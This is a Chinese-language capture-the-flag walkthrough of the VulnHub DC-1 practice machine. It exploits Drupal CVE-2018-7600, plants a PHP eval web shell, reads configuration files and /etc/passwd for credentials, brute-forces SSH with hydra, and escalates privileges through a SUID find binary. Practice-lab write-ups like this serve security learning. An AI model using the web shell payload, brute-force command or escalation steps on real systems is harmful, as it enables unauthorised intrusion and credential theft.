靶机地址：https://www.vulnhub.com/entry/dc-1-1,292/

### **靶机目标：**

目标1：Getshell

目标2：通过flag提示找到thefinalflag.txt。

### **使用工具:**

nmap、Hydra、Xshell、中国菜刀。

### **操作过程**

#### **0x00 信息收集**

访问`http://192.168.180.43/` ,使用Wappalyzer插件可查看CMS为drupal7。可以搜索与之相关的漏洞看能否Getshell。

![](../Images/4be6794339a3211a39f05668cf1e56cc.png)  

使用nmap扫描端口

输入`nmap -sV -p- 192.168.182.43`

![](../Images/94d9016fd7bb5ec75a86aa95836ba3d7.png)  

查看其端口信息，发现只有80端口可以访问，所以我们就针对此内容管理系统。

根据网上查看得到此版本存在命令执行漏洞（CVE-2018-7600）。

#### **0x01 漏洞利用**

在网上找到漏洞测试的脚本，修改脚本执行whoami命令。  

![](../Images/4930d607af81e47a32f34bd6abeace20.png)

![](../Images/ddc6ad1546499c7b17fe0b7586b2c654.png)  

可以看到已经成功执行了命令。

那么，我们尝试写shell脚本。

![](../Images/85b5f3f3827377dd3da9d67f595eb074.png)

重新执行，发现并未成功写入。

![](../Images/1b778a3409e6fb086757312bc653cbb4.png)

尝试其他命令，有一些命令是可以实现的，不能插马和不能查看目录文件，想想应该是根目录错误的原因，并不是/var/www/html。在经过一番折腾之后，发现根目录是/var/www。

修改目录之后可以查看文件如index.php文件，但是仍未写马成功。

![](../Images/de958a2c1077a995775a4b0024835d4c.png)

![](../Images/0b78b948b21b29c94e71024e1f2354c3.png)

使用`echo 1 > /var/www/2.txt`写入文件成功，应该是我们写入payload的问题。

修改payload：`echo '<?php @eval($_POST[a]);?>' > /var/www/000.php`

访问`http://192.168.180.43/000.php`为空白页面，说明写入成功。

![](../Images/db4939ff2a88d491aadfbb700031400f.png)

使用菜刀成功连接。  

![](../Images/1a75c2984da2d8b43fb080e7f7ae0cb3.png)

接下来查找flag文件。根目录下存在flag1.txt，flag1.txt的内容为`Every good CMS needs a config file - and so do you`提示我们查看配置文件。

![](../Images/fe041febb7d248fb90b2f3c01aba9618.png)

drupal的默认配置文件为/sites/defult/settings.php，查看配置文件。我们会发现存在数据库的账号，密码，并提示了flag2。  

![](../Images/50cad4ce3cdbdf26f6e3b928659b899d.png)

拿到了数据库的账号密码，分别是dbuser  R0ck3t。但是没有拿到登陆的账号密码。

查看/etc/passwd，内容如下方所示。

![](../Images/1ce0426422c7ecdab03fa2724af0f010.png)

发现存在flag4的用户。

使用暴力破解来查看登陆密码，这里我使用的是hydra，命令是`hydra -l flag4 -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.180.43`，查看到密码为orange。

关于hydra的一些用法这里我就不多说了，附上链接：`https://www.cnblogs.com/endust/p/11801799.html`。

![](../Images/45ecfecdd75ab076232b77d26f3baee6.png)

使用xshell成功登录ssh。  

![](../Images/c56a85a77a491c5243d18f612792a269.png)

这时候就可以用我们之前得到的数据库的账号密码进行登陆了。

![](../Images/71edcf687650099c0353f96b89b68493.png)

然后开始找数据，这里我发现之前连接的是drupaldb数据库，先查看此数据库。

![](../Images/3c273ec3d5e1f7c86035b5e67368f05c.png)

show tables 发现存在users表。  

![](../Images/29a0c0c2c1186f1ac8d87f0c6ed21f7a.png)

发现admin用户的账号和密码。

![](../Images/c0c7d9361d82f0d9381b6efddf5b2b1b.png)

drupal/scripts目录下存在加密脚本，得到加密结果之后我们直接在数据库进行更改即可。

![](../Images/8ea4186191728be38f4a51bb245cd75f.png)

提示更改成功。可自行百度搜索重置drupal的密码。  

![](../Images/6af54eac5d0b3ad9fff9fc7f97105071.png)

成功登录到后台。

![](../Images/72498f5c3ca2a3530be9b0af9be4689a.png)

  

在网站后台寻找有用的东西。

  

![](../Images/3fd2ba858ec568dc7304b313473015be.png)

点开之后会看到find和-exec的字样。

![](../Images/6a1ec5b0b327603076553faf8bf2d287.png)

#### **0x02 提权**

查看flag4.txt提示有root权限才能查看，尝试SUID提权。

![](../Images/445d07bf7239678a451411227f43c8f0.png)

我们查看具有root用户权限的SUID文件

```
find / -perm -u=s -type f 2>/dev/null
```

![](../Images/c854fdc49fbb18695683ef6ae2ee9c4b.png)

我们就找find，先查看其信息，发现其确实是root用户权限的SUID的文件 。  

![](../Images/aedb574cc3402ec662ca7bbfddd8e308.png)

![](../Images/6849a44fb60bd22482fb7bac84b9859e.png)

![](../Images/02a63a4a9a79ef9ec01bd01fbb37e2c1.png)

提升为root权限，并拿到flag。  

### **思路总结：**

首先通过扫描端口发现可利用的点为drupal的cms，查找此cms漏洞。使用脚本执行命令写入文件Getshell。经过flag1的提示，查看配置文件，获取到数据库账号和密码，查看/etc/passwd获取到存在flag4用户。使用hydra进行ssh爆破，获取到密码，登录并连接是数据库。通过drupal的特性构造hash值，在数据库进行密码的更改从而登录后台。在后台flag3的内容为suid提权的字样。通过suid提权拿到root权限，最终查看到thefinalflag.txt文件。
